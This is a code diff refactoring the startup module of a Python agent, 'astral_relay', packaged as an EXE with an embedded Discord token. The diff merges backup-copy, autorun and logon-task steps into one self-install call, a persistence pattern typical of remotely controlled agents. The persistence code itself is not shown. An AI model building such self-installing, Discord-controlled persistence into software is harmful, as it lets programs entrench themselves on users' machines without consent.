@@ -11,6 +11,7 @@ from __future__ import annotations
 import asyncio
 import signal
 import sys
+from typing import Any
 
 EXIT_OK = 0
 EXIT_GENERAL = 1
@@ -31,14 +32,6 @@ def _safe_write(text: str) -> None:
         stream.write(text + "\n")
     except (OSError, ValueError, AttributeError):
         pass
-
-
-def _parse_early(argv: list[str]) -> dict:
-    return {
-        "version": "--version" in argv or "-v" in argv,
-        "self_test": "--self-test" in argv,
-        "report": _flag_value(argv, "--self-test-report"),
-    }
 
 
 def _flag_value(argv: list[str], flag: str):
@@ -131,13 +124,9 @@ async def run_agent(token: str, config: dict, start=None) -> Any:
             raise RuntimeError("Discord rejected the embedded token. Rebuild the EXE with a fresh token.") from err
         raise
     loop = asyncio.get_running_loop()
-    stopped = asyncio.Event()
 
     async def shutdown() -> None:
-        try:
-            await client.close()
-        finally:
-            stopped.set()
+        await client.close()
 
     for signame in ("SIGINT", "SIGTERM"):
         try:
@@ -154,19 +143,15 @@ async def main(argv=None) -> int:
     if "--self-test" in args:
         return handle_self_test(args)
     from astral_relay.agent import payload as payload_mod
-    from astral_relay.agent.error_log import log_fatal
 
     try:
         found = payload_mod.load_embedded_payload()
     except Exception as exc:
         await _log_fatal_async(str(exc))
         return EXIT_NO_PAYLOAD if isinstance(exc, FileNotFoundError) else EXIT_BAD_CONFIG
-    from astral_relay.agent.startup import ensure_autorun, ensure_backup_copy, ensure_logon_task
+    from astral_relay.agent.startup import apply_self_install
 
-    _backup_status, backup_path = ensure_backup_copy()
-    ensure_autorun(backup_path)
-    if backup_path:
-        ensure_logon_task(backup_path)
+    apply_self_install(found["config"])
     try:
         await run_agent(found["token"], found["config"])
         await asyncio.Event().wait()
@@ -188,9 +173,6 @@ async def _log_fatal_async(message: str) -> None:
             await result
     except Exception:
         pass
-
-
-from typing import Any  # noqa: E402 - kept at bottom to keep early-dispatch imports lazy
 
 
 def entry() -> None:
